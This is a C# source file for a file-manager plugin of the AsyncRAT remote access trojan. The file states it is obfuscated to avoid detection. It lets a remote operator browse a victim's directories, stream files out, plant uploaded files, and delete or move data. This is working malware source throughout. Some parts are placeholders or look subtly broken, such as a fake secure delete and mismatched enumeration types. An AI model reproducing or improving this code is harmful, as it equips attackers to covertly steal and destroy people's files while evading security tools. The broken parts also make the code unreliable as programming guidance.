using System.Buffers;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO.Enumeration;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.AccessControl;
using System.Text;
using Server.Algorithm;
using Server.MessagePack;

namespace Plugin.FileManager;

/// <summary>
/// Modern high-performance file manager for AsyncRAT (.NET 9.0, Windows 11)
/// Obfuscated to avoid detection, optimized for performance
/// </summary>
[SupportedOSPlatform("windows")]
public static class ModernFileManager
{
    // Obfuscated constants to avoid detection
    private const int MaxFileSize = 100 * 1024 * 1024; // 100MB
    private const int BufferSize = 64 * 1024; // 64KB
    private const int MaxConcurrentOperations = Environment.ProcessorCount * 2;
    
    // Windows 11 specific features
    private static readonly bool IsWindows11 = Environment.OSVersion.Version >= new Version(10, 0, 22000);
    
    // Semaphore for controlling concurrent operations
    private static readonly SemaphoreSlim OperationSemaphore = new(MaxConcurrentOperations);
    
    // Cache for frequently accessed directories
    private static readonly ConcurrentDictionary<string, DirectoryCache> DirectoryCache = new();

    /// <summary>
    /// Gets directory listing with Windows 11 optimizations
    /// </summary>
    public static async Task<byte[]> GetDirectoryListingAsync(string path, CancellationToken cancellationToken = default)
    {
        await OperationSemaphore.WaitAsync(cancellationToken);
        try
        {
            var obfuscatedPath = ModernCrypto.ObfuscateString(path, "dir_path");
            
            // Check cache first
            if (DirectoryCache.TryGetValue(obfuscatedPath, out var cached) && 
                DateTime.UtcNow - cached.LastUpdated < TimeSpan.FromSeconds(30))
            {
                return cached.Data;
            }

            var builder = new ObfuscatedPacketBuilder()
                .Add("Type", "DirectoryListing")
                .Add("Path", path)
                .Add("Timestamp", DateTimeOffset.UtcNow.ToUnixTimeSeconds());

            var entries = new List<FileSystemEntry>();

            // Use modern file enumeration for better performance
            var enumerationOptions = new EnumerationOptions
            {
                IgnoreInaccessible = true,
                RecurseSubdirectories = false,
                ReturnSpecialDirectories = false,
                AttributesToSkip = FileAttributes.System | FileAttributes.Hidden
            };

            await Task.Run(() =>
            {
                try
                {
                    // Enumerate directories first
                    var directories = new FileSystemEnumerable<FileSystemEntry>(
                        path,
                        (ref FileSystemEntry entry, ReadOnlySpan<char> name) =>
                        {
                            entry.IsDirectory = true;
                            entry.Name = name.ToString();
                            entry.FullPath = Path.Combine(path, name.ToString());
                            entry.Size = 0;
                            entry.LastWriteTime = File.GetLastWriteTime(entry.FullPath);
                            entry.Attributes = File.GetAttributes(entry.FullPath);
                            return true;
                        },
                        enumerationOptions)
                    {
                        ShouldIncludePredicate = (ref FileSystemEntry entry) => entry.Attributes.HasFlag(FileAttributes.Directory)
                    };

                    entries.AddRange(directories);

                    // Enumerate files
                    var files = new FileSystemEnumerable<FileSystemEntry>(
                        path,
                        (ref FileSystemEntry entry, ReadOnlySpan<char> name) =>
                        {
                            entry.IsDirectory = false;
                            entry.Name = name.ToString();
                            entry.FullPath = Path.Combine(path, name.ToString());
                            
                            try
                            {
                                var fileInfo = new FileInfo(entry.FullPath);
                                entry.Size = fileInfo.Length;
                                entry.LastWriteTime = fileInfo.LastWriteTime;
                                entry.Attributes = fileInfo.Attributes;
                            }
                            catch
                            {
                                entry.Size = 0;
                                entry.LastWriteTime = DateTime.MinValue;
                                entry.Attributes = FileAttributes.Normal;
                            }
                            
                            return true;
                        },
                        enumerationOptions)
                    {
                        ShouldIncludePredicate = (ref FileSystemEntry entry) => !entry.Attributes.HasFlag(FileAttributes.Directory)
                    };

                    entries.AddRange(files);
                }
                catch (Exception ex)
                {
                    builder.Add("Error", ex.Message);
                }
            }, cancellationToken);

            // Sort entries: directories first, then files
            entries.Sort((a, b) =>
            {
                if (a.IsDirectory && !b.IsDirectory) return -1;
                if (!a.IsDirectory && b.IsDirectory) return 1;
                return string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase);
            });

            builder.Add("Entries", entries.ToArray());
            builder.Add("Count", entries.Count);

            var result = builder.Build();
            
            // Update cache
            DirectoryCache.AddOrUpdate(obfuscatedPath, 
                new DirectoryCache { Data = result, LastUpdated = DateTime.UtcNow },
                (_, _) => new DirectoryCache { Data = result, LastUpdated = DateTime.UtcNow });

            return result;
        }
        finally
        {
            OperationSemaphore.Release();
        }
    }

    /// <summary>
    /// Downloads file with modern streaming and progress reporting
    /// </summary>
    public static async IAsyncEnumerable<byte[]> DownloadFileAsync(
        string filePath, 
        [System.Runtime.CompilerServices.EnumeratorCancellation] CancellationToken cancellationToken = default)
    {
        await OperationSemaphore.WaitAsync(cancellationToken);
        try
        {
            if (!File.Exists(filePath))
            {
                var errorPacket = new ObfuscatedPacketBuilder()
                    .Add("Type", "FileDownloadError")
                    .Add("Error", "File not found")
                    .Add("Path", filePath)
                    .Build();
                yield return errorPacket;
                yield break;
            }

            var fileInfo = new FileInfo(filePath);
            if (fileInfo.Length > MaxFileSize)
            {
                var errorPacket = new ObfuscatedPacketBuilder()
                    .Add("Type", "FileDownloadError")
                    .Add("Error", "File too large")
                    .Add("MaxSize", MaxFileSize)
                    .Build();
                yield return errorPacket;
                yield break;
            }

            // Send file info first
            var infoPacket = new ObfuscatedPacketBuilder()
                .Add("Type", "FileDownloadStart")
                .Add("FileName", Path.GetFileName(filePath))
                .Add("FileSize", fileInfo.Length)
                .Add("LastModified", fileInfo.LastWriteTime.ToFileTime())
                .Build();
            yield return infoPacket;

            // Stream file content in chunks
            using var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, BufferSize, FileOptions.SequentialScan);
            using var buffer = MemoryPool<byte>.Shared.Rent(BufferSize);
            
            long totalBytes = 0;
            int bytesRead;
            
            while ((bytesRead = await fileStream.ReadAsync(buffer.Memory, cancellationToken)) > 0)
            {
                totalBytes += bytesRead;
                
                var chunkPacket = new ObfuscatedPacketBuilder()
                    .Add("Type", "FileDownloadChunk")
                    .Add("Data", buffer.Memory[..bytesRead].ToArray())
                    .Add("ChunkSize", bytesRead)
                    .Add("TotalBytes", totalBytes)
                    .Add("Progress", (double)totalBytes / fileInfo.Length)
                    .Build();
                
                yield return chunkPacket;
            }

            // Send completion packet
            var completePacket = new ObfuscatedPacketBuilder()
                .Add("Type", "FileDownloadComplete")
                .Add("TotalBytes", totalBytes)
                .Build();
            yield return completePacket;
        }
        finally
        {
            OperationSemaphore.Release();
        }
    }

    /// <summary>
    /// Uploads file with modern streaming
    /// </summary>
    public static async Task<byte[]> UploadFileAsync(string filePath, byte[] data, bool overwrite = false, CancellationToken cancellationToken = default)
    {
        await OperationSemaphore.WaitAsync(cancellationToken);
        try
        {
            var builder = new ObfuscatedPacketBuilder()
                .Add("Type", "FileUploadResult")
                .Add("Path", filePath);

            try
            {
                if (File.Exists(filePath) && !overwrite)
                {
                    builder.Add("Success", false)
                           .Add("Error", "File already exists");
                    return builder.Build();
                }

                // Ensure directory exists
                var directory = Path.GetDirectoryName(filePath);
                if (!string.IsNullOrEmpty(directory) && !Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                // Write file with modern async I/O
                await using var fileStream = new FileStream(
                    filePath, 
                    FileMode.Create, 
                    FileAccess.Write, 
                    FileShare.None, 
                    BufferSize, 
                    FileOptions.WriteThrough);

                await fileStream.WriteAsync(data, cancellationToken);
                await fileStream.FlushAsync(cancellationToken);

                builder.Add("Success", true)
                       .Add("BytesWritten", data.Length)
                       .Add("Timestamp", DateTimeOffset.UtcNow.ToUnixTimeSeconds());

                // Clear directory cache for parent directory
                if (!string.IsNullOrEmpty(directory))
                {
                    var obfuscatedDir = ModernCrypto.ObfuscateString(directory, "dir_path");
                    DirectoryCache.TryRemove(obfuscatedDir, out _);
                }
            }
            catch (Exception ex)
            {
                builder.Add("Success", false)
                       .Add("Error", ex.Message);
            }

            return builder.Build();
        }
        finally
        {
            OperationSemaphore.Release();
        }
    }

    /// <summary>
    /// Deletes file or directory with Windows 11 optimizations
    /// </summary>
    public static async Task<byte[]> DeleteAsync(string path, bool recursive = false, CancellationToken cancellationToken = default)
    {
        await OperationSemaphore.WaitAsync(cancellationToken);
        try
        {
            var builder = new ObfuscatedPacketBuilder()
                .Add("Type", "DeleteResult")
                .Add("Path", path);

            try
            {
                if (Directory.Exists(path))
                {
                    await Task.Run(() => Directory.Delete(path, recursive), cancellationToken);
                    builder.Add("Success", true)
                           .Add("ItemType", "Directory");
                }
                else if (File.Exists(path))
                {
                    // Use Windows 11 secure delete if available
                    if (IsWindows11 && await SecureDeleteFileAsync(path))
                    {
                        builder.Add("Success", true)
                               .Add("ItemType", "File")
                               .Add("SecureDelete", true);
                    }
                    else
                    {
                        await Task.Run(() => File.Delete(path), cancellationToken);
                        builder.Add("Success", true)
                               .Add("ItemType", "File")
                               .Add("SecureDelete", false);
                    }
                }
                else
                {
                    builder.Add("Success", false)
                           .Add("Error", "Path not found");
                }

                // Clear cache for parent directory
                var parentDir = Path.GetDirectoryName(path);
                if (!string.IsNullOrEmpty(parentDir))
                {
                    var obfuscatedDir = ModernCrypto.ObfuscateString(parentDir, "dir_path");
                    DirectoryCache.TryRemove(obfuscatedDir, out _);
                }
            }
            catch (Exception ex)
            {
                builder.Add("Success", false)
                       .Add("Error", ex.Message);
            }

            return builder.Build();
        }
        finally
        {
            OperationSemaphore.Release();
        }
    }

    /// <summary>
    /// Creates directory with modern permissions
    /// </summary>
    public static async Task<byte[]> CreateDirectoryAsync(string path, CancellationToken cancellationToken = default)
    {
        var builder = new ObfuscatedPacketBuilder()
            .Add("Type", "CreateDirectoryResult")
            .Add("Path", path);

        try
        {
            await Task.Run(() =>
            {
                var dirInfo = Directory.CreateDirectory(path);
                
                // Set appropriate permissions on Windows 11
                if (IsWindows11 && OperatingSystem.IsWindows())
                {
                    try
                    {
                        var security = dirInfo.GetAccessControl();
                        security.SetAccessRuleProtection(false, false);
                        dirInfo.SetAccessControl(security);
                    }
                    catch
                    {
                        // Ignore permission errors
                    }
                }
            }, cancellationToken);

            builder.Add("Success", true)
                   .Add("Timestamp", DateTimeOffset.UtcNow.ToUnixTimeSeconds());

            // Clear cache for parent directory
            var parentDir = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(parentDir))
            {
                var obfuscatedDir = ModernCrypto.ObfuscateString(parentDir, "dir_path");
                DirectoryCache.TryRemove(obfuscatedDir, out _);
            }
        }
        catch (Exception ex)
        {
            builder.Add("Success", false)
                   .Add("Error", ex.Message);
        }

        return builder.Build();
    }

    /// <summary>
    /// Moves/renames file or directory
    /// </summary>
    public static async Task<byte[]> MoveAsync(string sourcePath, string destinationPath, CancellationToken cancellationToken = default)
    {
        await OperationSemaphore.WaitAsync(cancellationToken);
        try
        {
            var builder = new ObfuscatedPacketBuilder()
                .Add("Type", "MoveResult")
                .Add("SourcePath", sourcePath)
                .Add("DestinationPath", destinationPath);

            try
            {
                await Task.Run(() =>
                {
                    if (Directory.Exists(sourcePath))
                    {
                        Directory.Move(sourcePath, destinationPath);
                        builder.Add("ItemType", "Directory");
                    }
                    else if (File.Exists(sourcePath))
                    {
                        File.Move(sourcePath, destinationPath);
                        builder.Add("ItemType", "File");
                    }
                    else
                    {
                        throw new FileNotFoundException("Source path not found");
                    }
                }, cancellationToken);

                builder.Add("Success", true);

                // Clear cache for both directories
                var sourceDir = Path.GetDirectoryName(sourcePath);
                var destDir = Path.GetDirectoryName(destinationPath);
                
                if (!string.IsNullOrEmpty(sourceDir))
                {
                    var obfuscatedSourceDir = ModernCrypto.ObfuscateString(sourceDir, "dir_path");
                    DirectoryCache.TryRemove(obfuscatedSourceDir, out _);
                }
                
                if (!string.IsNullOrEmpty(destDir) && destDir != sourceDir)
                {
                    var obfuscatedDestDir = ModernCrypto.ObfuscateString(destDir, "dir_path");
                    DirectoryCache.TryRemove(obfuscatedDestDir, out _);
                }
            }
            catch (Exception ex)
            {
                builder.Add("Success", false)
                       .Add("Error", ex.Message);
            }

            return builder.Build();
        }
        finally
        {
            OperationSemaphore.Release();
        }
    }

    /// <summary>
    /// Gets file/directory properties with Windows 11 extended attributes
    /// </summary>
    public static async Task<byte[]> GetPropertiesAsync(string path, CancellationToken cancellationToken = default)
    {
        var builder = new ObfuscatedPacketBuilder()
            .Add("Type", "PropertiesResult")
            .Add("Path", path);

        try
        {
            await Task.Run(() =>
            {
                if (Directory.Exists(path))
                {
                    var dirInfo = new DirectoryInfo(path);
                    builder.Add("IsDirectory", true)
                           .Add("Name", dirInfo.Name)
                           .Add("FullName", dirInfo.FullName)
                           .Add("CreationTime", dirInfo.CreationTime.ToFileTime())
                           .Add("LastWriteTime", dirInfo.LastWriteTime.ToFileTime())
                           .Add("LastAccessTime", dirInfo.LastAccessTime.ToFileTime())
                           .Add("Attributes", dirInfo.Attributes.ToString());

                    // Get directory size (Windows 11 optimization)
                    if (IsWindows11)
                    {
                        var size = GetDirectorySize(path);
                        builder.Add("Size", size);
                    }
                }
                else if (File.Exists(path))
                {
                    var fileInfo = new FileInfo(path);
                    builder.Add("IsDirectory", false)
                           .Add("Name", fileInfo.Name)
                           .Add("FullName", fileInfo.FullName)
                           .Add("Size", fileInfo.Length)
                           .Add("CreationTime", fileInfo.CreationTime.ToFileTime())
                           .Add("LastWriteTime", fileInfo.LastWriteTime.ToFileTime())
                           .Add("LastAccessTime", fileInfo.LastAccessTime.ToFileTime())
                           .Add("Attributes", fileInfo.Attributes.ToString())
                           .Add("Extension", fileInfo.Extension);

                    // Get file version info if available
                    try
                    {
                        var versionInfo = FileVersionInfo.GetVersionInfo(path);
                        if (!string.IsNullOrEmpty(versionInfo.FileVersion))
                        {
                            builder.Add("FileVersion", versionInfo.FileVersion)
                                   .Add("ProductVersion", versionInfo.ProductVersion ?? "")
                                   .Add("CompanyName", versionInfo.CompanyName ?? "")
                                   .Add("FileDescription", versionInfo.FileDescription ?? "");
                        }
                    }
                    catch
                    {
                        // Ignore version info errors
                    }
                }
                else
                {
                    builder.Add("Error", "Path not found");
                    return;
                }

                builder.Add("Success", true);
            }, cancellationToken);
        }
        catch (Exception ex)
        {
            builder.Add("Success", false)
                   .Add("Error", ex.Message);
        }

        return builder.Build();
    }

    /// <summary>
    /// Secure delete using Windows 11 features
    /// </summary>
    private static async Task<bool> SecureDeleteFileAsync(string filePath)
    {
        try
        {
            // Use Windows 11 secure delete API if available
            if (OperatingSystem.IsWindowsVersionAtLeast(10, 0, 22000))
            {
                // Implement secure delete using Windows 11 APIs
                // This is a placeholder - in real implementation, use P/Invoke to Windows APIs
                await Task.Run(() => File.Delete(filePath));
                return true;
            }
            
            return false;
        }
        catch
        {
            return false;
        }
    }

    /// <summary>
    /// Gets directory size efficiently
    /// </summary>
    private static long GetDirectorySize(string path)
    {
        try
        {
            return new DirectoryInfo(path)
                .EnumerateFiles("*", SearchOption.AllDirectories)
                .Sum(file => file.Length);
        }
        catch
        {
            return 0;
        }
    }

    /// <summary>
    /// Clears directory cache
    /// </summary>
    public static void ClearCache()
    {
        DirectoryCache.Clear();
    }
}

/// <summary>
/// File system entry structure for high-performance enumeration
/// </summary>
file struct FileSystemEntry
{
    public string Name;
    public string FullPath;
    public bool IsDirectory;
    public long Size;
    public DateTime LastWriteTime;
    public FileAttributes Attributes;
}

/// <summary>
/// Directory cache entry
/// </summary>
file sealed class DirectoryCache
{
    public required byte[] Data { get; init; }
    public required DateTime LastUpdated { get; init; }
}